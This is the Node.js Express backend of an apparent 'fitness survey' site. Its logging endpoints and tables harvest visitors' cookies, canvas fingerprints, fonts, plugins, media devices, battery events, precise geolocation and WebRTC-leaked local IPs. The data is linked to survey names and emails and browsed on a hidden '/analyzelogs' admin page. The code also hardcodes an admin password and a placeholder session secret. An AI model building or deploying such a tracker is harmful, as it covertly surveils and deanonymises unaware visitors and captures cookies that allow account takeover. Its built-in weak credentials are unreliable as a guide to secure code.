const express = require('express');
const { Pool } = require('pg');
const path = require('path');
const session = require('express-session');
const app = express();
const port = process.env.PORT || 3000;

// PostgreSQL connection
const pool = new Pool({
    connectionString: process.env.DATABASE_URL || 'postgres://username:password@localhost:5432/gatech_fitness',
    ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

// Initialize database tables
pool.query(`
    CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        ip TEXT,
        userId TEXT,
        timestamp TEXT,
        userAgent TEXT,
        browser JSONB,
        screen JSONB,
        window JSONB,
        device JSONB,
        connection JSONB,
        referrer TEXT,
        url TEXT,
        cookies TEXT,
        timezone TEXT,
        plugins JSONB,
        mimeTypes JSONB,
        canvasFingerprint TEXT,
        sessionDuration TEXT,
        battery JSONB,
        fonts JSONB,
        mediaDevices JSONB
    );
    CREATE TABLE IF NOT EXISTS surveys (
        id SERIAL PRIMARY KEY,
        ip TEXT,
        userId TEXT,
        timestamp TEXT,
        name TEXT,
        email TEXT,
        frequency TEXT,
        goal TEXT,
        feedback TEXT
    );
    CREATE TABLE IF NOT EXISTS geo (
        id SERIAL PRIMARY KEY,
        ip TEXT,
        userId TEXT,
        timestamp TEXT,
        latitude FLOAT,
        longitude FLOAT,
        accuracy FLOAT,
        altitude FLOAT,
        heading FLOAT,
        speed FLOAT
    );
    CREATE TABLE IF NOT EXISTS webrtc (
        id SERIAL PRIMARY KEY,
        ip TEXT,
        userId TEXT,
        timestamp TEXT,
        localIp TEXT
    );
    CREATE TABLE IF NOT EXISTS battery (
        id SERIAL PRIMARY KEY,
        ip TEXT,
        userId TEXT,
        timestamp TEXT,
        batteryEvent JSONB
    );
`).catch(err => console.error('Error creating tables:', err));

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(session({
    secret: 'your-secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: process.env.NODE_ENV === 'production' }
}));

// Hardcoded credentials (change before deployment)
const validCredentials = {
    username: 'admin',
    password: 'gatech2025'
};

// Authentication middleware
const isAuthenticated = (req, res, next) => {
    if (req.session.isAuthenticated) {
        return next();
    }
    res.redirect('/login?error=1');
};

// Serve index.html for root and custom route
app.get(['/', '/fitness-survey'], (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve login page
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Handle login
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    if (username === validCredentials.username && password === validCredentials.password) {
        req.session.isAuthenticated = true;
        res.redirect('/analyzelogs');
    } else {
        res.redirect('/login?error=1');
    }
});

// Handle logout
app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/login');
});

// Serve analysis page
app.get('/analyzelogs', isAuthenticated, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'analyzelogs.html'));
});

// Summarize log data
app.get('/summarize', isAuthenticated, async (req, res) => {
    try {
        const userLogs = await pool.query('SELECT * FROM users');
        const surveyLogs = await pool.query('SELECT * FROM surveys');
        const geoLogs = await pool.query('SELECT * FROM geo');
        const webrtcLogs = await pool.query('SELECT * FROM webrtc');
        const batteryLogs = await pool.query('SELECT * FROM battery');

        const users = {};
        userLogs.rows.forEach(log => {
            const key = `${log.ip}|${log.userId}`;
            if (!users[key]) {
                users[key] = { ip: log.ip, userId: log.userId, userData: [], surveyData: [], geoData: [], webrtcData: [], batteryData: [] };
            }
            users[key].userData.push({
                timestamp: log.timestamp,
                userAgent: log.userAgent,
                browser: log.browser,
                screen: log.screen,
                window: log.window,
                device: log.device,
                connection: log.connection,
                referrer: log.referrer,
                url: log.url,
                cookies: log.cookies,
                timezone: log.timezone,
                plugins: log.plugins,
                mimeTypes: log.mimeTypes,
                canvasFingerprint: log.canvasFingerprint,
                sessionDuration: log.sessionDuration,
                battery: log.battery,
                fonts: log.fonts,
                mediaDevices: log.mediaDevices
            });
        });
        surveyLogs.rows.forEach(log => {
            const key = `${log.ip}|${log.userId}`;
            if (users[key]) {
                users[key].surveyData.push({
                    timestamp: log.timestamp,
                    name: log.name,
                    email: log.email,
                    frequency: log.frequency,
                    goal: log.goal,
                    feedback: log.feedback
                });
            }
        });
        geoLogs.rows.forEach(log => {
            const key = `${log.ip}|${log.userId}`;
            if (users[key]) {
                users[key].geoData.push({
                    timestamp: log.timestamp,
                    latitude: log.latitude,
                    longitude: log.longitude,
                    accuracy: log.accuracy,
                    altitude: log.altitude,
                    heading: log.heading,
                    speed: log.speed
                });
            }
        });
        webrtcLogs.rows.forEach(log => {
            const key = `${log.ip}|${log.userId}`;
            if (users[key]) {
                users[key].webrtcData.push({
                    timestamp: log.timestamp,
                    localIp: log.localIp
                });
            }
        });
        batteryLogs.rows.forEach(log => {
            const key = `${log.ip}|${log.userId}`;
            if (users[key]) {
                users[key].batteryData.push({
                    timestamp: log.timestamp,
                    batteryEvent: log.batteryEvent
                });
            }
        });

        const exerciseFrequencies = surveyLogs.rows.reduce((acc, log) => {
            acc[log.frequency] = (acc[log.frequency] || 0) + 1;
            return acc;
        }, {});

        res.json({
            users: Object.values(users),
            exerciseFrequencies
        });
    } catch (error) {
        console.error('Error summarizing data:', error);
        res.status(500).json({ status: 'error', message: 'Failed to summarize data' });
    }
});

// Log client data
app.post('/log', async (req, res) => {
    try {
        const data = {
            ...req.body,
            ip: req.ip || req.connection.remoteAddress,
            timestamp: new Date().toISOString(),
        };
        await pool.query(
            `INSERT INTO users (ip, userId, timestamp, userAgent, browser, screen, window, device, connection, referrer, url, cookies, timezone, plugins, mimeTypes, canvasFingerprint, sessionDuration, battery, fonts, mediaDevices) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20)`,
            [data.ip, data.userId, data.timestamp, data.userAgent, data.browser, data.screen, data.window, data.device, data.connection, data.referrer, data.url, data.cookies, data.timezone, data.plugins, data.mimeTypes, data.canvasFingerprint, data.sessionDuration, data.battery, data.fonts, data.mediaDevices]
        );
        res.json({ status: 'success', message: 'Data logged' });
    } catch (error) {
        console.error('Error saving log:', error);
        res.status(500).json({ status: 'error', message: 'Failed to log data' });
    }
});

// Log geolocation data
app.post('/log-geo', async (req, res) => {
    try {
        const data = {
            ...req.body,
            ip: req.ip || req.connection.remoteAddress,
            timestamp: new Date().toISOString(),
        };
        await pool.query(
            `INSERT INTO geo (ip, userId, timestamp, latitude, longitude, accuracy, altitude, heading, speed) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)`,
            [data.ip, data.userId, data.timestamp, data.latitude, data.longitude, data.accuracy, data.altitude, data.heading, data.speed]
        );
        res.json({ status: 'success', message: 'Geo data logged' });
    } catch (error) {
        console.error('Error saving geo log:', error);
        res.status(500).json({ status: 'error', message: 'Failed to log geo data' });
    }
});

// Log WebRTC data
app.post('/log-webrtc', async (req, res) => {
    try {
        const data = {
            ...req.body,
            ip: req.ip || req.connection.remoteAddress,
            timestamp: new Date().toISOString(),
        };
        await pool.query(
            `INSERT INTO webrtc (ip, userId, timestamp, localIp) VALUES ($1, $2, $3, $4)`,
            [data.ip, data.userId, data.timestamp, data.localIp]
        );
        res.json({ status: 'success', message: 'WebRTC data logged' });
    } catch (error) {
        console.error('Error saving WebRTC log:', error);
        res.status(500).json({ status: 'error', message: 'Failed to log WebRTC data' });
    }
});

// Log survey data
app.post('/log-survey', async (req, res) => {
    try {
        const data = {
            ...req.body,
            ip: req.ip || req.connection.remoteAddress,
            timestamp: new Date().toISOString(),
        };
        await pool.query(
            `INSERT INTO surveys (ip, userId, timestamp, name, email, frequency, goal, feedback) VALUES ($1, $2, $3, $4, $5, $6, $7, $8)`,
            [data.ip, data.userId, data.timestamp, data.name, data.email, data.frequency, data.goal, data.feedback]
        );
        res.json({ status: 'success', message: 'Survey data logged' });
    } catch (error) {
        console.error('Error saving survey log:', error);
        res.status(500).json({ status: 'error', message: 'Failed to log survey data' });
    }
});

// Log battery events
app.post('/log-battery', async (req, res) => {
    try {
        const data = {
            ...req.body,
            ip: req.ip || req.connection.remoteAddress,
            timestamp: new Date().toISOString(),
        };
        await pool.query(
            `INSERT INTO battery (ip, userId, timestamp, batteryEvent) VALUES ($1, $2, $3, $4)`,
            [data.ip, data.userId, data.timestamp, data.batteryEvent]
        );
        res.json({ status: 'success', message: 'Battery data logged' });
    } catch (error) {
        console.error('Error saving battery log:', error);
        res.status(500).json({ status: 'error', message: 'Failed to log battery data' });
    }
});

// Handle form submission
app.post('/submit', async (req, res) => {
    try {
        const data = {
            ...req.body,
            ip: req.ip || req.connection.remoteAddress,
            timestamp: new Date().toISOString(),
            userId: req.body.userId || 'unknown'
        };
        await pool.query(
            `INSERT INTO surveys (ip, userId, timestamp, name, email, frequency, goal, feedback) VALUES ($1, $2, $3, $4, $5, $6, $7, $8)`,
            [data.ip, data.userId, data.timestamp, data.name, data.email, data.frequency, data.goal, data.feedback]
        );
        res.redirect('/fitness-survey');
    } catch (error) {
        console.error('Error saving form submission:', error);
        res.status(500).send('Error processing submission');
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});